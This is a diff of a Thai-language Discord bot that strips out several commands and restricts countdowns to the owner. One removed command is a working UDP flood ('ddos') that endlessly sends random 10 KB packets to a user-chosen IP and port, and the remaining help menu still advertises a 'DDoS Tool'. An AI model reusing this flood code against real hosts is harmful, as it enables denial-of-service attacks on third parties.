@@ -5,10 +5,7 @@ import urllib.parse, urllib.request, re
 import requests
 from time import sleep
 import math
-import socket
 import os
-import serial
-import dht11test
 
 
 intents = discord.Intents.default()
@@ -77,20 +74,6 @@ async def congrat(ctx):
 	await ctx.send(embed = congrat)
 
 
-# OS
-@bot.command()
-async def shutdown(ctx):
-	print("Shutting down...")
-	await ctx.send("❌ Shutting down...")
-	ctx.bot.logout()
-
-@bot.command()
-async def restart(ctx):
-	print("Restarting...")
-	await ctx.send("♻️ Restarting...")
-	os.system('RunBot.py')
-
-
 # Math
 @bot.command()
 async def sum(ctx, numOne: float, numTwo: float):
@@ -149,17 +132,12 @@ async def help(ctx):
 	h.add_field(name="📩 เชิญบอท", value="`&invite`")
 	h.add_field(name="⚙️ คำนวณเลข", value="`&help_math`")
 	h.add_field(name="⏲️ เคานต์ดาวน์", value="`&countdown [เวลา]`")
-	h.add_field(name="🔺 สร้างพีระมิด [ERROR]", value="`&pyramid [จำนวนชั้น]`")
 	h.add_field(name="📐 สร้างสามเหลี่ยมมุมฉาก", value="`&right_triangle [จำนวนชั้น]`")
 	h.add_field(name="🔄 แปลงหน่วยอุณหภูมิ", value="`&help_temp`")
 	h.add_field(name="😷 ตรวจสอบสถานการณ์ไวรัส COVID-19", value="`&covid`")
 	h.add_field(name="🌡 ตรวจสอบอุณหภูมิและความชื้น", value="`&dht11`")
 	h.add_field(name="🔄 แปลงเปอร์เซ็นต์และตัวเลข", value="`&help_percent`")
-	h.add_field(name="▶️ Youtube Search [ERROR]", value="`&yt [ชื่อคลิป]`")
 	h.add_field(name="🚀 โปรแกรมยิงไอพี DDoS Tool", value="`&ddosins`")
-	h.add_field(name="📡 ยิงไอพี", value="`&ddos [Target] [Port]`")
-	h.add_field(name="❌ ปิดการทำงานบอท", value="`&shutdown`")
-	h.add_field(name="♻ รีบูตการทำงานบอท", value="`&restart`")
 	await ctx.send(embed = h)
 
 @bot.command()
@@ -207,20 +185,6 @@ async def guild(ctx):
 
 	await ctx.send(embed=embed)
 
-@bot.command()
-async def yt(ctx, *, search):
-
-	query_string = urllib.parse.urlencode({
-		'search_query': search
-	})
-	htm_content = urllib.request.urlopen(
-		'http://www.youtube.com/results?' + query_string
-	)
-	# print(html_content.read().decode())
-	search_results = re.findall('href=\"\\/watch\\?v=(.{11})', htm_content.read().decode())
-	# I will put just the first result, you can loop the response to show more results
-	await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])
-
 
 # Temp
 @bot.command()
@@ -258,36 +222,11 @@ async def covid(ctx) :
 		await covid_stat(ctx)
 
 @bot.command()
-async def pyramid(ctx, size: int):
-	noname1 = ""
-	space = size - 1
-	for a in range(0, size):
-		for s in range(0, space):
-			noname1 += "\n"
-		space -= 1
-		for x in range(0, a+1):
-			if x == a:
-				noname1 += "\*"
-			else:
-				noname1 += "\*\*"
-		await ctx.send(noname1)
-
-@bot.command()
 async def right_triangle(ctx, size: int):
 	result = ""
 	for i in range(size):
 		result += "\*"*(i+1) + "\n"
 	await ctx.send(result)
-
-@bot.command()
-async def square(ctx, size: int):
-	for y in range(size) :
-		if y == 0 or y == size-1 :
-			await ctx.send("#"*size)
-		else :
-			await ctx.send("#",end="")
-			await ctx.send(" "*(size-2), end="")
-			await ctx.send("#")
 
 
 # Percent
@@ -323,8 +262,8 @@ async def invite(ctx):
 # Countdown
 @bot.command()
 async def countdown(ctx, time: int):
-	if time > 100 :
-		await ctx.send("หากคุณต้องการนับถอยหลังมากกว่า 100 วินาที โปรดใช้ `&forcecountdown`")
+	if time > 120 :
+		await ctx.send("ไม่สามารถทำได้ เนื่องจากมีความเสี่ยงที่จะปิดบอทไม่ทัน")
 	else :
 		while time > 1:
 			time = time - 1
@@ -333,10 +272,11 @@ async def countdown(ctx, time: int):
 
 @bot.command()			
 async def forcecountdown(ctx, time:int):
-	while time > 1:
-			time = time - 1
-			await ctx.send(f"Time remaining: {time} seconds")
-			sleep(1)	
+	if 269000561255383040 == ctx.message.author.id :
+		while time > 1:
+				time = time - 1
+				await ctx.send(f"Time remaining: {time} seconds")
+				sleep(1)	
 
 @bot.listen()
 async def on_message(message):
@@ -344,25 +284,6 @@ async def on_message(message):
 		if message.author.id == bot.user.id:
 			await message.channel.send('Time Up !!')
 
-@bot.command()			
-async def dht11(ctx):
-	await ctx.send(dht11test.dht11_out())
-
-@bot.command()
-async def ddos(ctx, target:str, port:int):
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
-		byte = os.urandom(10240)
-
-		sent = 1
-
-		while True:
-			out = ""
-			s.sendto(byte, (target, port))
-			out += f"Sending {sent} To {target} with port {port}"
-			sent = sent + 13466
-
-			await ctx.send(out)
-			sleep(5)
 
 # Events
 @bot.event
@@ -378,10 +299,6 @@ async def on_member_join(message):
 
 
 # Listen
-async def on_command(ctx):
-	ch = ctx.bot.get_channel(782287323261304853)
-	await ch.send("test")
-
 @bot.listen()
 async def on_message(message):
 	if "fuck" in message.content.lower():
@@ -422,5 +339,5 @@ async def on_message(message):
 		await bot.process_commands(message)
 
 
-Token = os.getenv("DafuqToken")
+Token = os.environ["DafuqToken"]
 bot.run(Token)
